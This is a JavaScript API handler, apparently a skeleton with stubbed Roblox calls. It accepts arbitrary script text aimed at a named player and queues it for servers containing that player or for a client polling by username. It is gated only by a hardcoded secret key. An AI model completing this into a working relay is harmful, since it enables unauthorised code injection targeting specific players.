// api/message.js
let scripts = {}; // { username: script }

const SECRET_KEY = "LMAOXD_Key768675";

// Dummy Roblox API calls — replace with actual endpoints
async function getAllServers(placeId) {
    // Replace with real Roblox endpoint for servers
    return ["server1", "server2", "server3"];
}

async function getPlayersInServer(serverId) {
    // Replace with actual Roblox API call
    const dummyPlayers = {
        "server1": ["Alice", "Bob"],
        "server2": ["Charlie", "Dave"],
        "server3": ["Eve", "Bob"]
    };
    return dummyPlayers[serverId] || [];
}

async function executeScriptInServer(script, serverId) {
    // Replace with actual Roblox RemoteEvent or HTTP endpoint
    console.log(`[EXEC] Script sent to server ${serverId}`);
    return true;
}

export default async function handler(req, res) {
    const key = req.body?.LMAOXD_Key768675 || req.query?.LMAOXD_Key768675;
    if (key !== SECRET_KEY) return res.status(401).json({ error: "Unauthorized: Invalid Key" });

    if (req.method === "POST") {
        const { script, target_username } = req.body;
        if (!script || !target_username) {
            return res.status(400).json({ error: "Missing script or target_username" });
        }

        scripts[target_username] = script;

        // Example place_id, replace with your actual game placeId
        const placeId = "1234567890";
        const servers = await getAllServers(placeId);
        const executedServers = [];

        for (const serverId of servers) {
            const players = await getPlayersInServer(serverId);
            if (players.includes(target_username)) {
                await executeScriptInServer(script, serverId);
                executedServers.push(serverId);
            }
        }

        return res.status(200).json({
            status: "success",
            target_username,
            executed_servers: executedServers
        });
    }

    // GET method: return and clear scripts (optional)
    if (req.method === "GET") {
        const username = req.query.username;
        if (!username || !scripts[username]) return res.status(404).json({ error: "No script for this user" });
        const scriptToSend = scripts[username];
        delete scripts[username]; // clear after fetch
        return res.status(200).send(scriptToSend);
    }

    return res.status(405).json({ error: "Method Not Allowed" });
}
